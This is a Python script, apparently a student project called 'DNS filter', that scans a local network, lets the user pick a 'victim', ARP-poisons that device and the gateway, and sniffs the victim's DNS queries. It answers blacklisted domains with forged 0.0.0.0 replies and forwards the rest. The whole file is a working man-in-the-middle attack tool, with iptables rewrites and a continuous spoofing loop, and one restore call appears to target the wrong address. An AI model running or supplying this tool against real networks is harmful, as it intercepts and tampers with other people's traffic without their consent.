#  Dns filter
#  Author: Federico Germinario 545081

#!/usr/bin/python

from subprocess import Popen, PIPE
from scapy.all import *
from Hashtable import Hashtable
import nmap
import threading
import argparse
import datetime

# Path file di sistema
log = "log.txt"   
policy = "policy.txt"
policy_blacklist = "blacklist-hostnames.txt"

def initial_setup():                    
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")   # Abilito l'ip forward
    os.system("iptables --flush")                         # Scrivo le regole del firewall iptables
    os.system("iptables --zero")
    os.system("iptables --delete-chain")
    os.system("iptables -F -t nat")
    os.system("iptables -A FORWARD -p UDP --dport 53 -j REJECT") # Regola per bloccare il forward dei pacchetti dns
    
def write_log(txt):     # Funzione per scivere sul file di log   
    f = open("log.txt", "a")
    now = datetime.datetime.now()
    current_time = now.strftime("%d/%m/%Y, %H:%M:%S")
    log = "[" + current_time + "]: " + txt + "\n"
    f.write(log)

def read_policy():      # Funzione per leggere il file di policy
    try:
        f = open(policy, "r")
        read = f.readlines()
        f.close()
        return read
    except IOError:
        print "[!!!] Could not read file:", policy 
        return None

def read_policy_blacklist():  # Funzione per leggere il file policy blacklist
    try:
        f = open(policy_blacklist, "r")
        read = f.readlines()
        f.close()
        return read
    except IOError:
        print "[!!!] Could not read file:", policy_blacklist
        return None

def arp_scan(range):   # Funzione che esegue una scansione arp con Nmap 
    try:
        nm = nmap.PortScanner()
        nm.scan(hosts=range, arguments='-sP')
        hosts_list = [(x, nm[x]['status']['state'], nm[x]['addresses']) for x in nm.all_hosts()]
        ip = {}
        for host, status, add in hosts_list:
            mac = add.get('mac')
            if(mac == None):
                mac = 'Unknown'
            ip[host] = status, mac
        return ip
    except KeyboardInterrupt:
        print "[*] Stop network scan"
        stop_dns_filter(None, None, None, None)

def stop_dns_filter(gateway_ip, target_ip, target_mac, gateway_mac):   # Funzione per fermare l'attacco e ripristanare le tabelle arp
    print "Keyboard Interrupt (CTRL+C)...Closing..."
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")     # Disabilito l'ip forword
    os.system("iptables --flush")	
    if gateway_ip != None and target_ip != None and target_mac != None and gateway_mac != None:
        restore_target(gateway_ip, target_ip, target_mac, gateway_mac)
    exit()

def selection(ip):      # Funzione per selezionare una vittima dalla scansione effettuata
    try:
        iplist = []
        i = 0
        for x in ip.keys():
            target_mac = ip[x][1]
            print "Target: [{}] | IP: {} [{}]".format(i, x, target_mac)
            iplist.append([x, target_mac.split()[0]])
            i+=1
        sel = input("Selection Number: ")
        if sel >= i:
            print "[!!!] Target not exist"
            stop_dns_filter(None, None, None, None)
        target_ip = iplist[sel][0]
        target_mac = iplist[sel][1]
        return target_ip, target_mac
    except KeyboardInterrupt:
        stop_dns_filter(None, None, None, None)

def get_gateway_ip():                           # Funzione che restituisce l'ip del gateway
    cmd = Popen(["ip", "route"], stdout=PIPE)
    gateway_ip = cmd.communicate()[0].split(" ")
    return gateway_ip[2]

def get_gateway_mac(gateway_ip):     # Funzione che restituisce il mac del gateway
    return srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=gateway_ip), timeout=10)[0][0][1][ARP].hwsrc

def arp_poisoning(gateway_ip, target_ip, gateway_mac, target_mac):       # Thread arp spoofing
    poison_target = ARP()    # Arp Reply
    poison_target.op = 2       
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print '[*] Beginning the ARP poison'

    while True:
        send(poison_target, verbose = False)
        send(poison_gateway, verbose = False)
        time.sleep(2)

def restore_target(gateway_ip, target_ip, gateway_mac, target_mac):  # Funzione che ripristina le tabelle arp dei dispositivi
    send(ARP(op=2, 
            hwsrc=gateway_mac,   
            psrc= gateway_ip, 
            hwdst= "ff:ff:ff:ff:ff:ff" , 
            pdst= target_ip), 
        count=6,
        verbose = False)
    send(ARP(op=2, 
            hwsrc=target_mac, 
            psrc= target_ip, 
            hwdst= "ff:ff:ff:ff:ff:ff", 
            pdst= target_ip),   
        count=6,
        verbose = False)

    print "[*] ARP Table restored to normal!"

def forwording_dns(pkt):                            # Thread forwording pacchetti dns 
    print "Forwarding: " + pkt[DNSQR].qname.rstrip('.').replace( "www.", "")
    response = sr1(                                 # Invia una richiesta dns e aspetta la risposta
        IP(dst='8.8.8.8')/
            UDP(sport=pkt[UDP].sport)/
            DNS(rd=1, id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname)),
        verbose=False,
        timeout=2
    )
    if response != None:
        resp_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport)/DNS()  # Incapsulo la risposta dns e la invio
        resp_pkt[DNS] = response[DNS]
        send(resp_pkt, verbose = False)                     

def callback (table_policy, table_policy_blacklist):  # Callback chiamata dalla funzione sniff ogni qual volta ricevo un pacchetto dns dall' ip 
    def filter(pkt):                                 # che sto sniffando
        dns = pkt['DNS']
        qname = dns.qd.qname.rstrip('.').replace( "www.", "") # Parsing dominio 
        if (table_policy == None or table_policy.search(qname + "\n") == None) and \
            (table_policy_blacklist == None or table_policy_blacklist.search(qname + "\n") == None): # Controllo se la richiesta dns deve essere bloccata
            if (
                DNS in pkt and
                pkt[DNS].opcode == 0 and
                pkt[DNS].ancount == 0
            ):
                forwording = threading.Thread(target=forwording_dns(pkt), args=[pkt]) 
                forwording.start()                              # Start thread per il forward del pacchetto dns 
        else:
            # Pacchetto dns bloccato 
            spf_resp = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/ \
                        DNS(id=pkt[DNS].id, ancount=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, rdata='0.0.0.0'))     
            send(spf_resp, verbose=False)                     # Invio alla vittima una risposta dns non valida
            write_log("Request dns " + qname + " dropped!")
            print "Request dns " + qname + " dropped!"
    return filter

def sniff_thread(iface, target_ip, table_policy, table_policy_blacklist):              # Thread sniffing pacchetti dns
    print '[*] Beginning sniffing\n'
    dns_filter = "udp and port 53 and src " + target_ip
    sniff(iface=iface, filter = dns_filter, prn=callback(table_policy, table_policy_blacklist), store=0)
	
def parse():  # Funzione parsing parametri di input
    parser = argparse.ArgumentParser(description='DNS FILTER')
    parser.add_argument('-i', '--interface', help='Network interface to attack on', action='store', dest='interface', default=False)
    parser.add_argument('-r', '--range', help='Local network scan range', action='store', dest='range', default=False)
    args = parser.parse_args()
    if len(sys.argv) == 1:
    	parser.print_help()
    	sys.exit(1)
    elif not args.range:
    	parser.error("Invalid range specification")
    	sys.exit(1)
    elif not args.interface:
    	parser.error("No network interface given")
    	sys.exit(1)
    return args.interface, args.range 

def start_dns_filter():
    iface, range = parse()  
    print "DNS filter"
    print "Author: Federico Germinario\n\n"  
    print "[*] Initial setup"
    initial_setup()
    print "[*] Reading file in progress..."
    policy_list = read_policy()                 
    policy_blacklist_list = read_policy_blacklist()
    if policy_list == None or policy_blacklist_list == None:
        exit()
    if len(policy_list) == 0:
        table_policy = None
    else:
        table_policy = Hashtable(len(policy_list))
        for line in policy_list:
            table_policy.insert(line, line)
        
    if len(policy_blacklist_list) == 0:
        table_policy_blacklist = None
    else:
        table_policy_blacklist = Hashtable(len(policy_blacklist_list))
        for line in policy_blacklist_list:
            table_policy_blacklist.insert(line, line)
    print "[*] Reading completed!"
               
    gateway_ip = get_gateway_ip()
    gateway_mac = get_gateway_mac(gateway_ip)
    if gateway_mac == 'Unknown':
        print '[!!!] Cannot find gateway mac'
        stop_dns_filter(None, None, None, None)
    print '\n[*] Interface: %s' %iface
    print '[*] Range scan: %s' %range
    print '[*] Gateway: %s [%s]' %(gateway_ip, gateway_mac)
    print '\n[*] Network scan in progress...'
    scan = arp_scan(range)                              # Scansione arp della rete locale 
    target_ip, target_mac = selection(scan) 
    if target_mac == "Unknown":
        print "[!!!] Mac not found"
        stop_dns_filter(None, None, None, None)
    print '\n[*] Target: %s [%s]' %(target_ip, target_mac)
    arp = threading.Thread(target=arp_poisoning, args=[gateway_ip, target_ip, gateway_mac, target_mac])  
    arp.setDaemon(True)
    arp.start()                                 # Start thread dell'ARP Spoofing   
    sniff = threading.Thread(target=sniff_thread, args=[iface,  target_ip, table_policy, table_policy_blacklist])
    sniff.setDaemon(True)
    sniff.start()                               # Start thread sniffing pacchetti dns
    return gateway_ip, target_ip, target_mac, gateway_mac
   
if __name__ == "__main__":   
    gateway_ip, target_ip, target_mac, gateway_mac = start_dns_filter()
    try:
        while True:
            pass
    except KeyboardInterrupt:
        stop_dns_filter(gateway_ip, target_ip, target_mac, gateway_mac)